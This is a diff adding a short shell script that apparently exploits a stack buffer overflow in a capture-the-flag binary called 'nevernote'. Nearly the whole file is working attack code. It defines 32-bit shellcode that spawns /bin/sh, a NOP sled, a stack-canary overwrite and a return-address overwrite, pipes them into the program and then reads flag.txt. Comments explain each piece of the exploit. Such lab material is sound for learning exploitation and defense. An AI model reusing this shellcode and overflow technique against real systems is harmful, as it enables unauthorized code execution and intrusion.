@@ -1,0 +1,15 @@
+export SHELLCODE="\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00" #32-bit shellcode which runs /bin/sh.
+ 
+export PAYLOAD="ABCDEFGHIJKLMNOP\x60\xd4\xff\xff\x00" #Overwrites the return address with 0xffffd460, which is about 0x70 after the pointer to buf (so it should point to somewhere in the NOP sled).
+ 
+export CANARY="/hom\x08\xc0\x04\x08" #Overwrites the canary to pass verification -- 0804c080 points to "/hom", so you have both an integer and a pointer to that integer.
+ 
+export BUFFER_JUNK=$(python -c "print '\r\r' + '\x90'*(510-26)") #Contains a NOP sled and \r to avoid segfaults.
+ 
+{ printf "name\n"; sleep 0.1;
+    printf "a\n"; sleep 0.1;
+    printf "$BUFFER_JUNK$SHELLCODE$CANARY$PAYLOAD\n";
+    sleep 0.1; printf "cat flag.txt"; }
+ 
+# ~/nvr/this_script | /home/nevernote/nevernote
+# then cat /home/nevernote/flag.txt
